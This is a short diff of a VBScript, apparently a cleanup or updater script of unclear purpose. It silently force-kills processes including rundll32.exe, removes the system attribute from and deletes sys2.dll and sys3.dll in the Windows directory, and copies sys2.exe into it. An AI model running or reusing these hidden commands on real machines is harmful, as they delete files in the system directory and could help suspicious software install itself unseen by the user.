@@ -7,6 +7,8 @@ With CreateObject("WScript.Shell")
     .Run "taskkill /f /im sys2.exe", 0, True 
     .Run "taskkill /f /im sys3.exe", 0, True
     .Run "taskkill /f /im rundll32.exe", 0, True
+    .Run "cmd /c attrib -s " & windir & "\sys2.dll" , 0, True
+    .Run "cmd /c attrib -s " & windir & "\sys3.dll" , 0, True
     .Run "cmd /c del " & windir & "\sys2.dll" , 0, True
     .Run "cmd /c del " & windir & "\sys3.dll" , 0, True
     .Run "cmd /c copy /Y " & windir & "\hp\sys2.exe " & windir & "\sys2.exe" , 0, True
